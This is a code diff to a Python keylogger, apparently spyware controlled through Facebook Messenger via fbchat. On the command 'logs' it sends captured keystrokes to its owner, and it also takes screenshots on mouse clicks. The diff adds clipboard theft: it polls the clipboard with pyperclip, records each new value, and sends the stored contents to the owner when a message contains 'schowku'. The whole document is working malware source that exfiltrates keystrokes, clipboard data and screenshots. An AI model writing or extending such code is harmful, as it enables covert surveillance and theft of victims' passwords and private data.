@@ -29,12 +29,16 @@ class FacebookController(fbchat.Client):
         if message == 'logs':
             self.send_to_owner(''.join(self.keylogger.flush_captured_keys()))
 
+        if 'schowku' in message:
+            self.send_to_owner('\n'.join(self.keylogger.flush_captured_clipboard()))
+
 
 class Keylogger(object):
     def __init__(self):
         self.captured_keys = []
         self.captured_pasting = []
         self.capture_screenshots_on_click = False
+        self.previous_clipboard_content = ''
 
         self.reset_screenshot_directory()
 
@@ -49,6 +53,10 @@ class Keylogger(object):
         captured_keys, self.captured_keys = self.captured_keys, []
         return captured_keys
 
+    def flush_captured_clipboard(self):
+        captured_clipboard, self.captured_pasting = self.captured_pasting, []
+        return captured_clipboard
+
     def get_saved_screenshots(self):
         return glob.glob('/tmp/screen*.jpg')
 
@@ -61,6 +69,12 @@ class Keylogger(object):
             screenshot = self._mark_mouse_position(pyscreenshot.grab())
             screenshot.save('/tmp/screen{}.jpg'.format(self.screenshot_counter))
             self.screenshot_counter += 1
+
+        import pyperclip # Doesn't work when imported globally
+        clipboard_content = pyperclip.paste()
+        if self.previous_clipboard_content != clipboard_content:
+            self.previous_clipboard_content = clipboard_content
+            self.captured_pasting.append(clipboard_content)
 
     def _mark_mouse_position(self, screenshot):
         mouse_x, mouse_y = pymouse.PyMouse().position()
